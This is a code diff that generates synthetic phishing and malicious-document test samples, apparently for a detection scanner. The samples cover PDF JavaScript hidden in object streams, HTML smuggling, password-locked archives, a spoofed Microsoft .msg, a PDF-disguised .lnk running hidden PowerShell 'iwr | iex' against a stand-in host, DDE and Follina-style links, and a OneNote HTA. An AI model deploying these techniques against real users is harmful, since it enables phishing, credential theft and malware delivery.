@@ -181,6 +181,372 @@ def preview_set(out: Path, work: Path) -> None:
     soffice(csv, "xlsx:Calc MS Excel 2007 XML", out, "CSV:44,34,76,1")
 
 
+# ---------------------------------------------------------------- depth samples (deep.py): hidden below layer one
+OBJSTM_JS_URL = "https://objstm-hidden.example/pay"
+OBJSTM_FORM_URL = "https://objstm-form.example/collect"
+EMBEDDED_URL = "https://embedded-link.example/login"
+SMUGGLED_ZIP_URL = "https://smuggled-zip.example/pay"
+CHARCODE_URL = "https://charcode-hidden.example/next"
+REVERSED_URL = "https://reversed-hidden.example/next"
+TABLE_QR_URL = "https://table-qr.example/scan"
+INVERTED_QR_URL = "https://inverted-qr.example/scan"
+
+
+def objstm_pdf() -> bytes:
+    """A PDF 1.5 whose catalog, page, JavaScript and SubmitForm actions all live inside ONE Flate-compressed object
+    stream, with an xref stream. A raw-bytes search finds no /JavaScript, /OpenAction or /SubmitForm at all."""
+    import zlib
+    js = b'app.launchURL("ht" + "tps://objstm-hid" + "den.example/pay", true); // TEST SAMPLE'
+    hidden = {
+        1: b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>",
+        3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R "
+           b"/Resources << /Font << /F1 6 0 R >> >> /AA << /O 7 0 R >> >>",
+        5: b"<< /S /JavaScript /JS (" + js + b") >>",
+        6: b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
+        7: b"<< /S /SubmitForm /F << /FS /URL /F (" + OBJSTM_FORM_URL.encode() + b") >> >>",
+    }
+    head, body = [], b""
+    for num, obj in hidden.items():
+        head.append(f"{num} {len(body)}")
+        body += obj + b"\n"
+    header = (" ".join(head) + "\n").encode()
+    stm = zlib.compress(header + body)
+    text = zlib.compress(b"BT /F1 20 Tf 72 700 Td (Account statement - TEST SAMPLE) Tj ET")
+    out, offsets = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"), {}
+
+    def obj(num: int, data: bytes) -> None:
+        offsets[num] = len(out)
+        out.extend(f"{num} 0 obj\n".encode() + data + b"\nendobj\n")
+
+    obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
+    obj(4, f"<< /Length {len(text)} /Filter /FlateDecode >>\nstream\n".encode() + text + b"\nendstream")
+    obj(8, f"<< /Type /ObjStm /N {len(hidden)} /First {len(header)} /Length {len(stm)} /Filter /FlateDecode >>"
+           "\nstream\n".encode() + stm + b"\nendstream")
+    offsets[9] = len(out)
+    rows = [b"\x00" + (0).to_bytes(4, "big") + (65535).to_bytes(2, "big")]
+    index = {n: i for i, n in enumerate(hidden)}
+    for n in range(1, 10):
+        if n in index:
+            rows.append(b"\x02" + (8).to_bytes(4, "big") + index[n].to_bytes(2, "big"))
+        else:
+            rows.append(b"\x01" + offsets[n].to_bytes(4, "big") + (0).to_bytes(2, "big"))
+    xref = b"".join(rows)
+    out.extend(f"9 0 obj\n<< /Type /XRef /Size 10 /W [1 4 2] /Root 1 0 R /Length {len(xref)} >>\nstream\n".encode()
+               + xref + b"\nendstream\nendobj\n")
+    out.extend(f"startxref\n{offsets[9]}\n%%EOF\n".encode())
+    return bytes(out)
+
+
+def depth_set(out: Path) -> None:
+    import base64
+    import io
+    import zipfile
+
+    import pypdf
+
+    # 1. Active content hidden in a compressed object stream (JavaScript that opens a link + a form that posts out).
+    (out / "statement-objstm.pdf").write_bytes(objstm_pdf())
+
+    # 2. A PDF that carries another file inside it; the inner file holds the real link.
+    w = pypdf.PdfWriter()
+    w.add_blank_page(612, 792)
+    w.add_attachment("invoice-details.html", f'<html><body><p>TEST SAMPLE</p><a href="{EMBEDDED_URL}">View invoice'
+                                             "</a></body></html>".encode())
+    with open(out / "statement-embedded.pdf", "wb") as fh:
+        w.write(fh)
+
+    # 3. HTML smuggling: a zip assembled in the browser from base64, plus links built from char codes / reversed text.
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as z:
+        z.writestr("readme.txt", f"TEST SAMPLE. Pay at {SMUGGLED_ZIP_URL}\n")
+    b64 = base64.b64encode(buf.getvalue()).decode()
+    codes = ",".join(str(ord(c)) for c in CHARCODE_URL)
+    (out / "smuggle-invoice.html").write_text(
+        "<html><body><p>Your invoice is downloading... TEST SAMPLE ONLY.</p><script>\n"
+        f'var d = atob("{b64}");\n'
+        "var b = new Uint8Array(d.length); for (var i = 0; i < d.length; i++) b[i] = d.charCodeAt(i);\n"
+        'var a = document.createElement("a"); a.href = URL.createObjectURL(new Blob([b]));\n'
+        'a.download = "invoice-7731.zip";\n'
+        f"var next = String.fromCharCode({codes});\n"
+        f'var back = "{REVERSED_URL[::-1]}".split("").reverse().join("");\n'
+        "</script></body></html>")
+
+    # 4. A QR code drawn as an HTML table (no image anywhere): only a rendered picture of the page shows it.
+    m = qrcode.QRCode(border=4)
+    m.add_data(TABLE_QR_URL)
+    m.make()
+    rows = "".join("<tr>" + "".join(f'<td bgcolor="{"#000000" if c else "#ffffff"}" width="6" height="6"></td>'
+                                    for c in row) + "</tr>" for row in m.get_matrix())
+    (out / "qr-table.html").write_text('<html><body><p>Scan to pay. TEST SAMPLE ONLY.</p>'
+                                       f'<table cellspacing="0" cellpadding="0" border="0">{rows}</table>'
+                                       "</body></html>")
+
+    # 5. A page that tries to pull files from inside the renderer into the picture (must be stripped before drawing).
+    (out / "local-file-probe.html").write_text(
+        '<html><body><p>Local file probe. TEST SAMPLE ONLY.</p><img src="file:///usr/share/pixmaps/debian-logo.png">'
+        '<iframe src="file:///etc/os-release"></iframe></body></html>')
+
+    # 6. A light-on-dark (inverted) QR code in an image.
+    img = qrcode.make(INVERTED_QR_URL, box_size=8, border=4).convert("L")
+    Image.eval(img, lambda v: 255 - v).save(out / "qr-inverted.png")
+
+
+# ---------------------------------------------------------------- tier 2 samples: archives, disk images, passwords
+PW = "4471"
+PW_AES_URL = "https://pw-aes-zip.example/pay"
+PW_7Z_URL = "https://pw-7z.example/pay"
+PW_PDF_URL = "https://pw-pdf.example/view"
+ISO_URL = "https://iso-inside.example/open"
+TARGZ_URL = "https://targz-inside.example/report"
+CHAIN_URL = "https://chain-iso.example/next"
+
+
+def _page(path: Path, url: str) -> Path:
+    path.write_text(f'<html><body><p>TEST SAMPLE</p><a href="{url}">Open document</a></body></html>')
+    return path
+
+
+def tier2_set(out: Path, work: Path) -> None:
+    import io
+    import tarfile
+    from email.message import EmailMessage
+
+    import pypdf
+    from pypdf.annotations import Link
+
+    t2 = work / "t2"
+    t2.mkdir()
+    run = lambda *cmd: subprocess.run(cmd, check=True, capture_output=True, cwd=t2)  # noqa: E731
+    # Locked attachments + the password in the email: the classic way past email gateways.
+    run("7zz", "a", "-tzip", f"-p{PW}", "-mem=AES256", "docs-aes.zip", _page(t2 / "pay-aes.html", PW_AES_URL).name)
+    run("7zz", "a", "-t7z", f"-p{PW}", "-mhe=on", "docs-hidden-names.7z", _page(t2 / "pay-7z.html", PW_7Z_URL).name)
+    w = pypdf.PdfWriter()
+    w.add_blank_page(612, 792)
+    w.add_annotation(0, Link(rect=(72, 600, 300, 640), url=PW_PDF_URL))
+    w.encrypt(PW)
+    pdf = io.BytesIO()
+    w.write(pdf)
+    msg = EmailMessage()
+    msg["From"] = "Accounts <billing@vendor-docs.example>"
+    msg["To"] = "analyst@contoso.com"
+    msg["Subject"] = "Your documents (TEST SAMPLE)"
+    msg.set_content(f"Your documents are attached. The password is {PW}\nTEST SAMPLE ONLY.")
+    for name in ("docs-aes.zip", "docs-hidden-names.7z"):
+        msg.add_attachment((t2 / name).read_bytes(), maintype="application", subtype="octet-stream", filename=name)
+    msg.add_attachment(pdf.getvalue(), maintype="application", subtype="pdf", filename="statement-locked.pdf")
+    (out / "documents-locked.eml").write_bytes(bytes(msg))
+
+    # A zip whose password appears nowhere: must be reported, not silently skipped.
+    run("7zz", "a", "-tzip", "-pNotInTheEmail-93", "locked-unknown.zip", _page(t2 / "secret.html", PW_AES_URL).name)
+    (out / "locked-unknown.zip").write_bytes((t2 / "locked-unknown.zip").read_bytes())
+
+    # A disk image (ISO) with a document inside.
+    iso_dir = t2 / "iso"
+    iso_dir.mkdir()
+    _page(iso_dir / "readme.html", ISO_URL)
+    run("bsdtar", "--format", "iso9660", "-cf", str(out / "shipping-docs.iso"), "-C", str(iso_dir), ".")
+
+    # gzip > tar > file.
+    _page(t2 / "report.html", TARGZ_URL)
+    with tarfile.open(out / "report.tar.gz", "w:gz") as tf:
+        tf.add(t2 / "report.html", arcname="report/report.html")
+
+    # The classic delivery chain: zip > ISO > file.
+    chain = t2 / "chain"
+    chain.mkdir()
+    _page(chain / "note.html", CHAIN_URL)
+    run("bsdtar", "--format", "iso9660", "-cf", str(t2 / "statement.iso"), "-C", str(chain), ".")
+    run("7zz", "a", "-tzip", str(out / "delivery.zip"), str(t2 / "statement.iso"))
+
+
+# ---------------------------------------------------------------- tier 2b: .msg, .lnk, OneNote, Office tricks
+def cfb(files: dict[str, bytes]) -> bytes:
+    """Minimal Compound File Binary (v3) writer, for TEST SAMPLES only (.msg and OLE packages; no free tool writes
+    them). files: {"storage/stream": data}. Small streams go in the mini stream, as the spec requires."""
+    import struct
+    END, FREE, FATSECT, NOSTREAM = 0xFFFFFFFE, 0xFFFFFFFF, 0xFFFFFFFD, 0xFFFFFFFF
+    nodes = [{"name": "Root Entry", "type": 5, "kids": [], "data": b""}]
+    index = {"": 0}
+    for path in sorted(files):
+        parts = path.split("/")
+        for i in range(1, len(parts) + 1):
+            key = "/".join(parts[:i])
+            if key not in index:
+                index[key] = len(nodes)
+                last = i == len(parts)
+                nodes.append({"name": parts[i - 1], "type": 2 if last else 1, "kids": [],
+                              "data": files[path] if last else b""})
+                nodes[index["/".join(parts[:i - 1])]]["kids"].append(index[key])
+    sectors, fat = [], []
+
+    def put(data: bytes, size: int = 512) -> int:
+        """Append data as a chain of sectors (regular: list `sectors`); return the first sector id."""
+        n = max(1, -(-len(data) // size))
+        start = len(sectors)
+        for i in range(n):
+            sectors.append(data[i * size:(i + 1) * size].ljust(size, b"\0"))
+            fat.append(start + i + 1 if i < n - 1 else END)
+        return start
+
+    mini, minifat = bytearray(), []
+    for nd in nodes:
+        if nd["type"] == 2 and len(nd["data"]) < 4096:
+            nd["start"] = len(mini) // 64 if nd["data"] else END
+            n = -(-len(nd["data"]) // 64)
+            for i in range(n):
+                minifat.append(nd["start"] + i + 1 if i < n - 1 else END)
+            mini += nd["data"].ljust(n * 64, b"\0")
+        elif nd["type"] == 2:
+            nd["start"] = put(nd["data"])
+    nodes[0]["start"] = put(bytes(mini)) if mini else END
+    nodes[0]["size"] = len(mini)
+    minifat_start = put(b"".join(struct.pack("<I", x) for x in minifat)) if minifat else END
+    n_minifat = -(-len(minifat) * 4 // 512)
+    for nd in nodes:  # siblings: sorted, chained through the right pointer (a valid, if unbalanced, tree)
+        nd.setdefault("left", NOSTREAM), nd.setdefault("right", NOSTREAM), nd.setdefault("child", NOSTREAM)
+        kids = sorted(nd["kids"], key=lambda k: (len(nodes[k]["name"]), nodes[k]["name"].upper()))
+        if kids:
+            nd["child"] = kids[0]
+            for a, b in zip(kids, kids[1:]):
+                nodes[a]["right"] = b
+    dirs = b""
+    for nd in nodes:
+        name = nd["name"].encode("utf-16-le") + b"\0\0"
+        size = nd.get("size", len(nd["data"])) if nd["type"] != 1 else 0
+        dirs += (name.ljust(64, b"\0") + struct.pack("<HBB3I", len(name), nd["type"], 1, nd["left"], nd["right"],
+                                                     nd["child"]) + b"\0" * 36
+                 + struct.pack("<IQ", nd.get("start", 0) if nd["type"] != 1 else 0, size))
+    dirs += (b"\0" * 64 + struct.pack("<HBB3I", 0, 0, 0, NOSTREAM, NOSTREAM, NOSTREAM) + b"\0" * 48) * (-len(nodes) % 4)
+    dir_start = put(dirs)
+    n_fat = 1
+    while (len(sectors) + n_fat) > n_fat * 128:
+        n_fat += 1
+    fat_ids = list(range(len(sectors), len(sectors) + n_fat))
+    fat += [FATSECT] * n_fat
+    fat += [FREE] * (n_fat * 128 - len(fat))
+    for i in range(n_fat):
+        sectors.append(b"".join(struct.pack("<I", x) for x in fat[i * 128:(i + 1) * 128]))
+    header = (bytes.fromhex("d0cf11e0a1b11ae1") + b"\0" * 16 + struct.pack("<HHHHH", 0x3E, 3, 0xFFFE, 9, 6)
+              + b"\0" * 6 + struct.pack("<IIIIIIIII", 0, n_fat, dir_start, 0, 4096, minifat_start, n_minifat, END, 0)
+              + b"".join(struct.pack("<I", x) for x in (fat_ids + [FREE] * (109 - n_fat))))
+    return header + b"".join(sectors)
+
+
+MSG_BODY_URL = "https://msg-body.example/login"
+MSG_ATTACH_URL = "https://msg-attach.example/pay"
+OLEPKG_URL = "https://olepkg-inside.example/run"
+LNK_URL = "https://lnk-payload.example/a.ps1"
+ONENOTE_URL = "https://onenote-hta.example/run"
+
+
+def _docx(document_xml: str, extra: dict[str, bytes] | None = None, rels: str = "") -> bytes:
+    import io
+    import zipfile
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+        z.writestr("[Content_Types].xml",
+                   '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/'
+                   'content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.'
+                   'relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Default Extension='
+                   '"bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/><Override PartName='
+                   '"/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.'
+                   'document.main+xml"/></Types>')
+        z.writestr("_rels/.rels", '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.'
+                   'openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.'
+                   'openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
+                   '</Relationships>')
+        z.writestr("word/document.xml", '<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.'
+                   f'openxmlformats.org/wordprocessingml/2006/main"><w:body>{document_xml}</w:body></w:document>')
+        if rels:
+            z.writestr("word/_rels/document.xml.rels", '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns='
+                       f'"http://schemas.openxmlformats.org/package/2006/relationships">{rels}</Relationships>')
+        for name, data in (extra or {}).items():
+            z.writestr(name, data)
+    return buf.getvalue()
+
+
+def _lnk(target: str, args: str, icon: str) -> bytes:
+    import struct
+    flags = 0x4 | 0x8 | 0x20 | 0x40 | 0x80  # HasName, HasRelativePath, HasArguments, HasIconLocation, IsUnicode
+    header = (struct.pack("<I", 0x4C) + bytes.fromhex("0114020000000000c000000000000046")
+              + struct.pack("<II", flags, 0x20) + b"\0" * 24 + struct.pack("<IiIHHII", 0, 0, 7, 0, 0, 0, 0))
+    sd = b"".join(struct.pack("<H", len(t)) + t.encode("utf-16-le") for t in ("Invoice (TEST SAMPLE)", target, args, icon))
+    return header + sd + b"\0\0\0\0"
+
+
+def tier2b_set(out: Path) -> None:
+    import base64
+    import struct
+
+    # Outlook .msg: spoofed sender in the original headers, a link in the body, an HTML attachment with a link.
+    u16 = lambda t: t.encode("utf-16-le")  # noqa: E731
+    att = "__attach_version1.0_#00000000/"
+    (out / "account-alert.msg").write_bytes(cfb({
+        "__properties_version1.0": b"\0" * 32,
+        "__substg1.0_0037001F": u16("Unusual sign-in activity (TEST SAMPLE)"),
+        "__substg1.0_1000001F": u16(f"Review the sign-in at {MSG_BODY_URL} TEST SAMPLE ONLY."),
+        "__substg1.0_007D001F": u16('From: "Microsoft 365 Security" <alerts@micros0ft-notice.example>\r\n'
+                                    "To: analyst@contoso.com\r\nSubject: Unusual sign-in activity (TEST SAMPLE)\r\n"
+                                    "Authentication-Results: mx.contoso.com; spf=fail; dkim=none; dmarc=fail\r\n"),
+        att + "__properties_version1.0": b"\0" * 16,
+        att + "__substg1.0_3707001F": u16("review.html"),
+        att + "__substg1.0_37010102": f'<html><body><a href="{MSG_ATTACH_URL}">Review</a> TEST SAMPLE</body></html>'.encode(),
+    }))
+
+    # Shortcut disguised as a PDF: runs hidden PowerShell with a base64 (UTF-16) command that downloads a script.
+    enc = base64.b64encode(f"iwr {LNK_URL} | iex  # TEST SAMPLE".encode("utf-16-le")).decode()
+    (out / "Invoice-7731.pdf.lnk").write_bytes(_lnk(
+        r"..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", f"-w hidden -nop -enc {enc}",
+        r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe"))
+
+    # Word document with an embedded file (OLE package) whose content holds a link, plus a DDE field.
+    payload = f'@echo off\r\nrem TEST SAMPLE\r\nstart "" "{OLEPKG_URL}"\r\n'.encode()
+    native = (struct.pack("<H", 2) + b"invoice.bat\0" + b"C:\\Users\\x\\invoice.bat\0" + struct.pack("<II", 0, 0)
+              + b"C:\\Users\\x\\AppData\\Local\\Temp\\invoice.bat\0" + struct.pack("<I", len(payload)) + payload)
+    ole = cfb({"\x01Ole10Native": struct.pack("<I", len(native)) + native})
+    (out / "contract-embedded.docx").write_bytes(_docx(
+        "<w:p><w:r><w:t>Contract (TEST SAMPLE). Double-click the icon to view.</w:t></w:r></w:p>",
+        {"word/embeddings/oleObject1.bin": ole}))
+    (out / "memo-dde.docx").write_bytes(_docx(
+        '<w:p><w:fldSimple w:instr=" DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;/k echo TEST SAMPLE&quot; ">'
+        "<w:r><w:t>Memo (TEST SAMPLE)</w:t></w:r></w:fldSimple></w:p>"))
+
+    # Protocol-handler links: Follina-style ms-msdt and search-ms (opens an attacker's share as a "search").
+    (out / "update-required.html").write_text(
+        "<html><body><p>Update required. TEST SAMPLE ONLY.</p>"
+        '<a href="search-ms:query=invoice&crumb=location:\\\\files.search-ms-test.example@SSL\\share">Open</a>'
+        '<script>/* TEST SAMPLE */ var x = "ms-msdt:/id PCWDiagnostic /skip force /param IT_BrowseForFile=test";'
+        "</script></body></html>")
+
+    # OneNote section with an embedded HTA file (the "double-click to view" trick). Synthetic: only the container
+    # structures the parser reads (section GUID + FileDataStoreObject), not a full OneNote file.
+    hta = (f'<html><head><HTA:APPLICATION id="t"/></head><body>TEST SAMPLE<script>var u = "{ONENOTE_URL}";'
+           "</script></body></html>").encode()
+    one = bytes.fromhex("e4525c7b8cd8a74daeb15378d02996d3").ljust(0x400, b"\0")
+    one += (bytes.fromhex("e716e3bd65261145a4c48d4d0b7a9eac") + struct.pack("<QIQ", len(hta), 0, 0) + hta
+            + bytes.fromhex("22a7fb71795e4e4eaf4b5ac4fc4ed1da").ljust(16, b"\0"))
+    (out / "shared-notes.one").write_bytes(one)
+
+    # Pattern from a real 2026-11-18 phish: invisible characters in the subject, and one PDF attached twice, once
+    # renamed .ics (a calendar invite) so filters that block PDFs let it through.
+    from email.message import EmailMessage
+    import pypdf as _pypdf
+    import io as _io
+    w = _pypdf.PdfWriter()
+    w.add_blank_page(612, 792)
+    pdf = _io.BytesIO()
+    w.write(pdf)
+    m = EmailMessage()
+    m["From"] = "Service-Help <help@renamed-ics.example>"
+    m["To"] = "analyst@contoso.com"
+    m["Subject"] = "Re\u200bmin\u200bder: Com\U000e0139plete Your Info (TEST SAMPLE)"
+    m.set_content("Please review the attached estimate. TEST SAMPLE ONLY.")
+    m.add_attachment(pdf.getvalue(), maintype="application", subtype="pdf", filename="estimate.pdf")
+    m.add_attachment(pdf.getvalue(), maintype="text", subtype="calendar", filename="estimate.ics")
+    m.add_attachment(b"", maintype="application", subtype="octet-stream", filename="User Agreement")
+    (out / "renamed-ics.eml").write_bytes(bytes(m))
+
+
 def main(out: Path) -> None:
     out.mkdir(parents=True, exist_ok=True)
     work = Path(tempfile.mkdtemp())
@@ -197,6 +563,9 @@ def main(out: Path) -> None:
                                    'var u = "https://dl-test.example/payload.bin";\n'
                                    'WScript.Echo("this is a test sample: " + u);\n')
     preview_set(out, work)
+    depth_set(out)
+    tier2_set(out, work)
+    tier2b_set(out)
     for p in sorted(out.iterdir()):
         print(f"{p.stat().st_size:>9}  {p.name}")
 
